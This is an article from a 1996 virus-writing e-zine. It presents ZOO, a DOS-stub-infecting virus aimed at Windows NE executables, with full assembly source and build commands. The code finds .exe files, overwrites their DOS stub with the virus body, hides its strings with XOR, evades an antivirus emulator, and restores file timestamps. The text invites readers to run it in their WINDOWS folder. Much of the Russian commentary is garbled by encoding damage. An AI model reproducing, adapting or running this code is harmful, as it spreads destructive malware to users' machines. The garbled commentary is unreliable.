   COMMENT *
         ÜÜ                  Û
        ßßß  Virus Magazine  Û Box 10, Kiev 148, Ukraine       IV   1996
        ßÛÛ ßßßßßßßßßßßßßßßß Û ßßßßßßßßßßßßßßßßßßß ß ßßßßÞßßß  ÛßßßßßßßÛ
         ÞÛ ÛßÜ Ûßß Üßß Üßß ÜÛÜ Üßß ÛßÛ    Ý Û ÜßÛ Û Üßß ÛÜÜ   Û Û ÛßÛ Û
          Û Û Û Ûß  Ûß  Û    Û  Ûß  Û Û    Û Û Û Û Û Û   Û     Û Û Û Û Û
          Û Þ Þ Þ   ÞÜÜ ÞÜÜ  Þ  ÞÜÜ ÞÜß     ßÛ ßÜÛ Þ ÞÜÜ ÞÜÜÜ  Û Û ÛÜÛ Û
          Þ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ  ÛÜÜÜÜÜÜÜÛ
             (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.


                  * ¤ ¯à¨¢¥âáâ¢®¢ âì â¥¡ï ¥é¥ à §, ã¢ ¦ ¥¬ë© ç¨â â¥«ì!
    Š ª-â®   ¯à®è«®© ¥¤¥«¥ á¨¤¥« ï ¢ „Ž‘-á¥áá¨¨ ¢ áà@#®¬ ª â «®£¥
    £ãá®£® ‚¨*d0Yz, ªãà¨« ¨, á«¥¤ãï á¢®¨¬ ¨§¢à é¥ç¥áª¨¬ ¯à¨¢ëçª ¬,
    à¥è¨« F3   exeè¨ª å ¯® ¦¨¬ âì. * ¦ «   ¯¥à¢®¬ - çãâì ¥
    ®ä¨£¥«. * ¦ «   ¢â®à®¬, ¯®â®¬   âà¥âì¥¬... :-[  ] *¥â, ¥
    £ãáë© ¢¨àãá à®¡ª® ¯àïâ « â¥«® á¢®¥ ¬ «¥ìª®¥ ¢ íâ¨å exeè¨ª å,
      ¢®§¬ãâ¨«  ¬¥ï à áâ®ç¨â¥«ì®áâì ª®¬¯ ¨¨ ŒiŠÚŽ$0äÅ -    áá¥¬¡-
    «¥àãî ¯à®£à ¬¬ã, ¢ë¤ îéãî   íªà  áâà®ªã 'This program requires
    Microsoft Windows.', íâ¨ á¢®«®ç¨ ¯®âà â¨«¨ ¥ 90 ¡ ©â (¢ EXE-ä®à¬ â¥),
      æ¥«ë© 1 Š!
         ‚ ¤ «ì¥©è¥¬ à áá¬ âà¨¢ ï NEèª¨ (¢ á¬ëá«¥ New Executable), ï
    ®¡ àã¦¨«, çâ® ª®¬¯¨«ïâ®àë ä¨à¬ë Borland â ª®© ¤ëàª¨ ¥ ®áâ ¢«ïîâ.
    Ÿ, á®®â¢¥âáâ¢¥®, âãâ ¦¥ à¥è¨« ¯®¯à®¡®¢ âì ¯®¦¨âì ¢ íâ®¬ ª¨«®¡ ©â¥
    (§ ç¥¬  è àã áâ®«ìª® ¬¥áâ  ¯à®¯ ¤ ¥â? ;-) —â® ¨§ íâ®£® ¯®«ãç¨«®áì -
    á¬®âà¨â¥ ¨¦¥. „«ï  ç «  ¥¬®£® ¯à®©¤¥¬áï ¯® íâ®¬ã "«¥¢®¬ã"
    ª¨«®¡ ©âã. „«ï ¢¨¤ë ¨§ ¢á¥£® ª¨«®¡ ©â  ¢ ¦ë â®«ìª® âà¨ ãá«®¢¨ï:
    ¯® á¬¥é¥¨î 400h ¤®«¦¥ áâ®ïâì § £®«®¢®ª ¢¨¤®¢®© ¯à®£¨,   ¨¬¥®
    'NE', ¢  ç «¥ ¯à®£¨ ¯® á¬¥é¥¨î 0h - 'MZ' ¨ ¯® á¬¥é¥¨î 3bh ¯ïâì
    ¡ ©â - 00h, 00h, 04h, 00h, 00h. * ä¨£  ®¨ â ¬ ã¦ë ï â ª ¨ ¥
    ¯®ï«, ® ¡¥§ ¨å ¢¨¤  áç¨â ¥â, çâ® exeè¨ª ï¢«ï¥âáï „Ž‘-¯à¨«®¦¥-
    ¨¥¬. *®¢â®àîáì, íâ® ¥ ¯à ¢¨«®, íâ  ä¨£ï ¯à¨áãâáâ¢ã¥â â®«ìª®
    ¢ exeè¨ª å, ¨¬¥îé¨å 'NE' ¯® á¬¥é¥¨î 400h (¢® ¢áïª®¬ á«ãç ¥
    ¤àã£¨å ¢ à¨ â®¢ ¤®á-¯à®£à ¬¬ë á 'NE' ¯® 400h ï ¥  è¥«).
    ‚®â, á®¡áâ¢¥®, ¤¨§ áá¥¬¡«¨à®¢ ë© ãç áâ®ª íâ®© á ¬®©
    ¤®á-¯à®£à ¬¬ë. Œ¥áâ , ¥ ¥áãé¨¥ á¬ëá«®¢®©  £àã§ª¨, ï
    ®ââã¤  ¢ëª¨ã«.

    00000000 dec bp ; 'M' á¨£ âãà 
    00000001 pop dx ; 'Z' EXE-ä ©« 
    ..................
    0000003B add [bx][si],al ; íâ® â¥ á ¬ë¥ ¯ïâì ¡ ©â:
    0000003D add al,0h       ; 00h, 00h, 04h, 00h, 00h
    0000003F db 0h
    ..................
    00000200 call 00000256   ; ¢ë§®¢ ¯à®æ¥¤ãàë,  å®¤ïé¥©áï ¯® á¬¥é¥¨î 256h
    á® á¬¥é¥¨ï 200h, á®¡áâ¢¥®, ¨  ç¨ ¥âáï ¨á¯®«¥¨¥ íâ®© ¡ ¤ï£¨ :)
    00000203 db 'This program requires Microsoft Windows.', 0dh, 0ah, '$'
    0000022E db 28h dup (20h) ; ª ç¥¬ã §¤¥áì 40 èâãª ¯à®¡¥«®¢, ï â ª ¨
                                ¥ ¯®ï« :(
    00000256 pop dx
    00000257 push cs
    00000258 pop ds           ; ds â¥¯¥àì = cs
    00000259 mov ah,09h ; ¢ë¢®¤ äà §ë win
    0000025B int 21h
    0000025D mov ax,4c01h ; ¢ëå®¤ ¢ „Ž‘ á errorlevel = 1
    00000260 int 21h
    ..................
    00000400 dec si ; 'N' á¨£ âãà 
    00000401 inc bp ; 'E' Windows New EXE

    ‘® á¬¥é¥¨ï 40h ¯® 200h ¨ á 252h ¯® 400h - á¯«®èë¥ ã«¨.
    ˆâ®£®, ¤«ï ¦¨§¨ ®áâ ¥âáï 400h - 20h (20h   EXE-header) - 3Ah
    (íâ®   ¢ë¢®¤ äà §ë, äà §ã ¨ ¢ëå®¤ ¢ „Ž‘) = 934 ¡ ©â . Œ¥
    å¢ â¨«® 383 ¡ ©â, ãç¨âë¢ ï â¥ªáâ®¢ë¥ äà §ë ¢ â¥«¥ ¨
    ¥®¯â¨¬¨§¨à®¢ ë© ª®¤. *¥¨á¯®«ì§®¢ ë¬ ®áâ «áï 551 ¡ ©â -
    ¬®¦® ¯®í¬ã ¥é¥ § áããâì ¯à¨ ¦¥« ¨¨ ;-)
      ’¥¯¥àì ¥¬®£® ® â®¬, çâ® ¦¥ íâ®â ZOO ¤¥« ¥â. ˆé¥â ¢ â¥ªãé¥¬
    ª â «®£¥ NE-ä ©«ë ¨ ¢¯¨áë¢ ¥âáï ¢ ¤®á-¯à®£à ¬¬ã. ‡ â¥¬ ¢ë¤ ¥â
    áâà®ªã ¯à® â®, ª ª ®è¨¡áï î§¥à, § ¯ãáâ¨¢ á¥© ä ©« ¯®¤ ¤®á®¬
    ('This program...') ¨ ¢ëå®¤¨â ¢ „Ž‘. *ã¦ë© NE-EXE ®¯à¥¤¥«ï¥â ¯®
    âà¥¬ ¯à¨§ ª ¬: 1) à áè¨à¥¨¥ .exe ;) 2) ¯® á¬¥é¥¨î 400h 'NE'
    3) ¯® á¬¥é¥¨î 200h 'èS', â® ¡¨èì ¢ëè¥®¯¨á ë© call. ’®«ìª®
    â®£¤  ® áç¨â ¥â, çâ® ¯®¯ «, ªã¤  ã¦® ¨ á®¢¥àè ¥â
    ¢ëè¥®¯¨á ë¥ ¤¥©áâ¢¨ï. …áâ¢¥âá¢¥®, ¥à¥§¨¤¥â - ¤«ï
    â ª¨å æ¥«¥© à¥§¨¤¥â ¡ë« ¡ë ¯à®áâ® «¨è¨¬  ¢®à®â®¬.
    *® ¬®¦® ¯®¤ª«îç¨âì ¢ RCE ¬¥å ¨§¬ § à ¦¥¨ï á¨¨å
    ä ©«®¢ ¨ â¥¬ á ¬ë¬ ¯à®¤«¥¢ âì á¢®¥ áãé¥áâ¢®¢ ¨ï ¨ ã¤¨¢«ïâì
    î§¥à , ¢ëáª ª¨¢ ï ®ââã¤ , £¤¥ ®  á á®¢á¥¬ ¥ ®¦¨¤ ¥â. ’¥¬
    ¡®«¥¥ çâ® ¬¥áâ  ¯à¥¤®áâ â®ç®, ¨ ¤«¨  ¯à®£à ¬¬ë ¥ ã¢¥«¨ç¨-
    ¢ ¥âáï.
      ’¥¯¥àì ¥¬®£® â¥ªáâ  ¤«ï ¦¥« îé¨å á¥© ZOO § ¯ãáâ¨âì ¨ ¯®â¥áâ¨à®¢ âì
      á¢®¥© ¬ è¨¥.
       Š®¬¯¨«¨âì ¨áå®¤¨ª ã¦® á«¥¤ãîé¨¬ ®¡à §®¬:
       TASM.EXE ZOO.ASM /M2 (¤¢  ¯à®å®¤ )
       TLINK.EXE ZOO.OBJ /T
    „®«¦¥ ¯®«ãç¨âìáï .com   383 ¡ ©â . Œã¢¨â¥ â®, çâ® ¯®«ãç¨«®áì,
    ¢ ª â «®£ WINDOWS, § ¯ãáª ¥â¥ ¨  á« ¦¤ ¥â¥áì! ;-)
   \\ *

   .model tiny
   .code
   org 100h
   start:
           mov ah,4eh      ;  ç¨ ¥¬ ¯®¨áª ¦¥àâ¢
   search:
           mov cx,06h
           mov si,offset fmask
           call @xor       ; à áªà¨¯âã¥¬ áâà®ªã '*.exe', 0h
           mov cx,20h
           int 21h
           jnc est_eshe_poroh_v_porohovnitsah
           call quit       ; ã¢ë, ¡®«ìè¥ exeè¨ª®¢ ¥â
   est_eshe_poroh_v_porohovnitsah:
           mov cx,06h
           jmp obmanem_etu_sranuyu_windu
           nop             ; á«¥¤ãîé¨¥ âà¨ áâà®ª¨ - â¥ á ¬ë¥ ¯ïâì ¡ ©â
           add [bx][si],al ; 00h, 00h
           add al,00h      ; 04h, 00h
           db 00h          ; 00h
   obmanem_etu_sranuyu_windu:
           mov si,offset fmask
           call @xor       ; § ªà¨¯âã¥¬ ¬ áªã ®¡à â®
           call savtim     ; ¤ âã/¢à¥¬ï á®åà ¨¬
           cmp word ptr ds:[9ah], virlen
           jbe findnext    ; ª ª®© ¦¥ NE-exe ¡ã¤¥â ¬¥ìè¥ ¤«¨ë ¢¨àï?
           mov dx,9eh
           call open       ; ®âªàë¢ ¥¬   çâ¥¨¥
           jc findnext     ; ®è¨¡ª¨... :(
           xchg ax,bx      ; åí¤« ä ©« 
           call fopen_via_sft ;   ¢®â â¥¯¥àì ®âªàë¢ ¥¬   § ¯¨áì :)
           mov dx,400h
           call seek       ; ãª § â¥«ì   400h
           call compare
           cmp word ptr ds:[slovo],'EN' ; *â® NE-exe?
           jnz close       ; ã¢ë, ¥â
           mov dx,200h
           call seek
           call compare
           cmp word ptr ds:[slovo],'Sè' ;   â®ç® íâ® NE-exe?
           ; 'èS' ¢ ¤¥¢áâ¢¥®¬ NE-exe ¥áâì ª®¤ call'    ¢ë¢®¤ äà §ë
           ; 'This...' ¨ ¢ëå®¤ ¢ „Ž‘
           jnz close
           mov dx,20h
           call seek
           call compare
           cmp word ptr ds:[slovo],04eb4h ;   ¬®¦¥â ¬ë âãâ ã¦¥ ¡ë«¨?
           jz close
           xor dx,dx
           call seek
           mov ah,40h      ; ã à § ¥ ¡ë«® ¥é¥  á §¤¥áì, â®£¤  ¡ã¤¥¬
           mov dx,offset mz ; ®à£ ¨§ã¥¬ ®¢ë© § £®«®¢®ª EXE-ä ©« 
           mov cx,20h
           int 21h
           mov ah,40h    ; ã ¨ § ¯¨è¥¬áï á ¬¨
           mov cx,virlen
           mov dx,100h
           int 21h
   close:
           call resttim    ; ¢à¥¬ï ¢®ááâ ®¢¨¬
           call @close     ; ã ¨ ä ©«¨ª § ªà®¥¬
   findnext:
           mov ah,4fh      ; ¨ ®¯ïâì - ª á«¥¤ãîé¥© ¦¥àâ¢¥
           jmp search

   ;;;;;;   íâ® ¯®è«¨ ¯à®æ¥¤ãà¨ë

   fopen_via_sft:
           push bx
           push es
           push di
           mov ax,1220h
           push ax
           int 2fh
           mov bl, byte ptr es:[di]
           pop ax
           sub al,0ah
           int 2fh
           mov word ptr es:[di+02h],02h
           pop di
           pop es
           pop bx
           ret

   @xor:
           push ax
           in al,42h ; íâ® ¯à¨ª®« ¤«ï wEb'€ - çâ®¡ë ® ¥ ªà¨ç « EXE.Virus
           mov ah,al
           in al,42h
           cmp al,ah
           jnz @web_idiot
           ret
   @web_idiot:
           pop ax
           push si
   @@xor:
           xor byte ptr [si],0dbh
           inc si
           loop @@xor
           pop dx
           ret

   seek:
           xor cx,cx
           mov ax,4200h
           int 21h
           ret

   open:
           mov ax,3d00h
           int 21h
           ret

   savtim:
           mov ax, word ptr ds:[96h]
           mov word ptr ds:[ftime], ax
           mov ax, word ptr ds:[98h]
           mov word ptr ds:[ftime+02h], ax
           ret

   resttim:
           mov ax,5701h
           mov cx, word ptr ds:[ftime]
           mov dx, word ptr ds:[ftime+02h]
           int 21h
           ret

   @close:
           mov ah,3eh
           int 21h
           ret

   compare:
           mov cx,02h
           mov ah,3fh
           mov dx,offset slovo
           int 21h
           ret

   mz      db 'M'
           db 'Z'
           db 9fh, 01h, 01h
           db 03h dup (0h)
           db 02h
           db 03h dup (0h)
           db 0ffh, 0ffh, 0f0h, 0ffh
           db 05h dup (0h)
           db 01h, 0f0h, 0ffh
           db 1ch
           db 07h dup (0h)
           ; íâ® „®á-EXE header, ª®â®àë© ¬ë ¬¥ï¥¬ NE-¯à®£à ¬¬ ¬

   fmask   db '*' xor 0dbh
           db '.' xor 0dbh
           db 'e' xor 0dbh
           db 'x' xor 0dbh
           db 'e' xor 0dbh
           db 0h  xor 0dbh
           ; á¨¥ ¥áâì è¨äà®¢  ï áâà®ª  '*.exe',0h - ¯®ïâ® ¤«ï ç¥£®

   win     db 'T' xor 0dbh, 'h' xor 0dbh, 'i' xor 0dbh, 's' xor 0dbh
           db 20h xor 0dbh, 'p' xor 0dbh, 'r' xor 0dbh, 'o' xor 0dbh
           db 'g' xor 0dbh, 'r' xor 0dbh, 'a' xor 0dbh, 'm' xor 0dbh
           db 20h xor 0dbh, 'r' xor 0dbh, 'e' xor 0dbh, 'q' xor 0dbh
           db 'u' xor 0dbh, 'i' xor 0dbh, 'r' xor 0dbh, 'e' xor 0dbh
           db 's' xor 0dbh, 20h xor 0dbh, 'M' xor 0dbh, 'i' xor 0dbh
           db 'c' xor 0dbh, 'r' xor 0dbh, 'o' xor 0dbh, 's' xor 0dbh
           db 'o' xor 0dbh, 'f' xor 0dbh, 't' xor 0dbh, 20h xor 0dbh
           db 'W' xor 0dbh, 'i' xor 0dbh, 'n' xor 0dbh, 'd' xor 0dbh
           db 'o' xor 0dbh, 'w' xor 0dbh, 's' xor 0dbh, '.' xor 0dbh
           db 0dh xor 0dbh, 0ah xor 0dbh, '$' xor 0dbh
   end_win:
           ; ã íâ® ¤ ¦¥ ®¡'ïáïâì ¥  ¤® :) - íâ® ¬ë ‚¨*d0Yz å®â¨¬

   author  db '(' xor 0dbh, 'c' xor 0dbh, ')' xor 0dbh
           db 20h xor 0dbh, 'D' xor 0dbh
           db 'N' xor 0dbh, 'a' xor 0dbh, 'z' xor 0dbh, 'i' xor 0dbh
           ; íâ® áâà®ª  '(c) DNazi', â® ¡¨èì ãª § ¨¥  ¢â®àáâ¢ 

   zoo     db 'Œ' xor 0dbh, 'ë' xor 0dbh, 20h xor 0dbh
           db 'ã' xor 0dbh, '©' xor 0dbh, '¤' xor 0dbh, '¥' xor 0dbh
           db '¬' xor 0dbh, 20h xor 0dbh, '¨' xor 0dbh, '§' xor 0dbh
           db 20h xor 0dbh, '§' xor 0dbh, '®' xor 0dbh, '®' xor 0dbh
           db '¯' xor 0dbh, ' ' xor 0dbh, 'à' xor 0dbh, 'ª' xor 0dbh
           db ' ' xor 0dbh, '!' xor 0dbh
           ; € íâ® á®¡áâ¢¥® ª«îç¥¢ ï áâà®ª  ¢ ¢¨àãá¥ - ¥£®  §¢ ¨¥
           ; 'Œë ã©¤¥¬ ¨§ §®®¯ àª !'

   quit:   ; ¢ëå®¤ ® ¨ ¢ €äà¨ª¥ ¢ëå®¤
           mov cx,end_win - win
           mov si,offset win
           call @xor
           mov ah,09h ; ‚ë¢®¤¨¬ ¯à®áì¡ã,
                      ; çâ®¡ë  á ¯®¤ ¢¨¤®© ¤àã£®© à § ¯ãáª «¨
           int 21h
           mov ax,4c01h    ; ã ¨ ª ¯ ¯¥-„Ž‘ã ¢¥à¥¬áï
           int 21h
   slovo  equ 0f000h ; íâ® ¯à®áâ® word ¤«ï ¤ ëå
   ftime  equ slovo - 04h ;   íâ® ¤«ï ¤ âë/¢à¥¬¥¨
   virlen equ $ - start ; á¨¥ ¥áâì  è  ¤«¨ 
   end start

                                                   (c) Dirty Nazi 1996
